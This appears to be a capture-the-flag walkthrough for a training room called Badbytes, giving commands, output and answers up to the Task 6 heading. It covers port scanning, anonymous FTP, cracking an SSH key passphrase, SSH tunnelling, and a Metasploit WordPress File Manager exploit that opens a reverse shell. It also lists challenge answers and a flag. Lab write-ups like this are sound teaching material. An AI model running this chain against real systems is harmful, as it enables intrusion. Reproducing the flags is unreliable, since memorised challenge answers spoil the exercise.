


<h2>Task 1 . Deploy the machine</h2>

<p><em>Answer the question below</em></p>

<p>1.1. <em>Wait 2-3 minutes for the VM to boot up.</em><br>
<code>No answer needed</code></p>

<br>
<h2>Tasl 2 . Reconnaissance</h2>
<br>

<p><em>Answer the questions below</em></p>

<p>2.1. <em>How many ports are open?</em><br>
<code>No answer needed</code></p>

<p>2.2. <em>What service is running on the lowest open port?</em><br>
<code>ssh</code></p>

<p>2.3. <em>What non-standard port is open?</em><br>
<code>30024</code></p>

```bash
:~/Badbytes# nmap -p- -vv MACHINE_IP
...
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
30024/tcp open  unknown syn-ack ttl 64
```

<p>2.4. <em>What service is running on the non-standard port?</em><br>
<code>ftp</code></p>

```bash
:~/Badbytes# :~/Badbytes# nmap -A -p 22,30024 MACHINE_IP
...
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
30024/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
|_-rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:XX.XX.XX.XX
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
```

<br>
<h2>Task 3 . Foothold</h2>
<br>

<p><em>Answer the questions below</em></p>

<p>3.1. <em>What username do we find during the enumeration process?</em><br>
<code>errorcauser</code></p>


<p>3.2. <em>What is the passphrase for the RSA private key?</em><br>
<code>cupcake</code></p>

```bash
:~/Badbytes# ftp MACHINE_IP 30024
Connected to MACHINE_IP.
220 (vsFTPd 3.0.5)
Name (MACHINE_IP:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
-rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt
226 Directory send OK.
ftp> mget *
mget id_rsa? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (1743 bytes).
226 Transfer complete.
1743 bytes received in 0.00 secs (3.1542 MB/s)
mget note.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (78 bytes).
226 Transfer complete.
78 bytes received in 0.00 secs (181.3616 kB/s)
ftp> exit
221 Goodbye.
```

```bash
:~/Badbytes# ls
id_rsa  note.txt
```

```bash
:~/Badbytes# cat note.txt
I always forget my password. Just let me store an ssh key here.
- errorcauser
```

```bash
:~/Badbytes# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,25B4B9725AB330EC

LGINB6oiLaGhDgr5D0+9C7+AJTyQbIlBNu8rAYNtlwvn7uN2z5L17esJRr0/PEW/
...

mTDaYO2KwZXCse7derYJ0eWpKiiKcmGwmi57m+uvTka+o8xA928/xw==
-----END RSA PRIVATE KEY-----
```

```bash
:~/Badbytes# python3 /opt/john/ssh2john.py id_rsa > hash
```

```bash
:~/Badbytes# john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="932" height="318" alt="image" src="https://github.com/user-attachments/assets/c6d79552-f76a-445f-87c3-cafb3f6129fe" />

<br>
<br>
<h2>Task 4 . Port Forwarding</h2>
<br>

<br>

<p><em>Answer the questions below</em></p>

<p>4.1. <em>What main TCP ports are listening on localhost?</em><br>
<code>80,3306</code></p>


<p>4.2. <em>What protocols are used for these ports?</em><br>
<code>http, mysql</code></p>

```bash
:~/Badbytes# chmod 600 id_rsa
```

```bash
:~/Badbytes# nano /etc/proxychains.conf
```

<img width="931" height="266" alt="image" src="https://github.com/user-attachments/assets/1011e634-7af3-4eea-b255-21b9549ef2a2" />

<br>
<br>

```bash
:~/Badbytes# ssh -i id_rsa -D 1337 errorcauser@MACHINE_IP
...
-bash-4.4$ 
```

```bash
:~/Badbytes# proxychains nmap -sT 127.0.0.1
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

<img width="938" height="249" alt="image" src="https://github.com/user-attachments/assets/cdc77f77-8d76-4188-8cd3-7529dda315a7" />

<br>
<br>

```bash
:~/Badbytes# ssh -i id_rsa -L 8000:127.0.01:80 errorcauser@MACHINE_IP
...
-bash-4.4$ 
```

<img width="1187" height="691" alt="image" src="https://github.com/user-attachments/assets/ffcf83cd-20e9-4b24-b0fc-d922944ed076" />

<br>
<br>
<h2>Task 5 . Web Exploitation</h2>
<br>

<p><em>Answer the questions below</em></p>

<p>5.1. <em>What CMS is running on the machine?</em><br>
<code>wordpress</code></p>

<p>5.2. <em>What protocols are used for these ports?</em><br>
<code>http, mysql</code></p>

<p>5.3. <em>What is the CVE number for directory traversal vulnerability?</em><br>
<code>CVE-2020-11738</code></p>

<p>5.4. <em>What is the CVE number for remote code execution vulnerability?</em><br>
<code>CVE-2020-25213</code></p>

<p>5.5. <em>There is a metasploit module for the exploit. You can use it to get the reverse shell. If you are feeling lucky you can follow any POC( Proof of Concept).</em><br>
<code>No answer needed</code></p>

<p>5.6. <em>What is the name of user that was running CMS?</em><br>
<code>cth</code></p>

<p>5.6. <em>What is the user flag?</em><br>
<code>THM{227906201d17d9c45aa93d0122ea1af7}</code></p>


```bash
:~/Badbytes# nmap -sC -sV -p8000 127.0.0.1
...
PORT     STATE SERVICE VERSION
8000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.3.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: BadByte &#8211; You&#039;re looking at me, but they are lookin...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds
```

<img width="936" height="266" alt="image" src="https://github.com/user-attachments/assets/20bd9d11-00e1-493c-a0a9-2fa2827739bb" />

<br>
<br>

```bash
:~/Badbytes# nmap -p8000 search-limit=1500 --script http-wordpress-enum 127.0.0.1 -vv
...
PORT     STATE SERVICE  REASON
8000/tcp open  http-alt syn-ack ttl 64
| http-wordpress-enum: 
| Search limited to top 100 themes/plugins
|   plugins
|     akismet
|_    duplicator 1.3.26
```

<img width="1098" height="241" alt="image" src="https://github.com/user-attachments/assets/ca3908da-5455-4f8d-8035-0e2f3c403995" />

<br>
<br>

<img width="1165" height="499" alt="image" src="https://github.com/user-attachments/assets/3b13ae0f-dbeb-44e6-bafb-54b08ba1fef0" />

<br>
<br>


<img width="1165" height="499" alt="image" src="https://github.com/user-attachments/assets/9be68f3a-0f97-4f92-8f74-34f21ed834f1" />

<br>
<br>

<img width="1154" height="568" alt="image" src="https://github.com/user-attachments/assets/36c18637-2019-46f4-b75c-605d6f1a37ba" />


<br>
<br>

```bash
:~/Badbytes#  msfconsole -q
```

```bash
msf6> search wordpress file manager

msf6 exploit(multi/http/wp_file_manager_rce) > set RPORT 8000
msf6 exploit(multi/http/wp_file_manager_rce) > set RHOSTS 127.0.0.1
msf6 exploit(multi/http/wp_file_manager_rce) > set LHOST AttackIP
msf6 exploit(multi/http/wp_file_manager_rce) > check
[*] 127.0.0.1:8000 - The target appears to be vulnerable.

...

msf6 exploit(multi/http/wp_file_manager_rce) > run
[*] Started reverse TCP handler on 10.81.117.66:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] 127.0.0.1:8000 - Payload is at /wp-content/plugins/wp-file-manager/lib/files/D9I7BS.php
[*] Sending stage (40004 bytes) to 10.81.188.64
[+] Deleted D9I7BS.php
[*] Meterpreter session 1 opened (10.81.117.66:4444 -> 10.81.188.64:33012) at 2026-02-07 20:31:15 +0000

meterpreter > shell
Process 3250 created.
Channel 0 created.
whoami
cth
pwd
/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files
cd /home
ls
cth
errorcauser
ubuntu
cd cth
ls
user.txt
cat user.txt
THM{227906201d17d9c45aa93d0122ea1af7}



```


<img width="779" height="194" alt="image" src="https://github.com/user-attachments/assets/92c7812f-0194-4125-8b12-6d6db1018249" />


<br>
<br>


<br>
<br>

<h2>Task 6 . Privilege Escalation</h2>

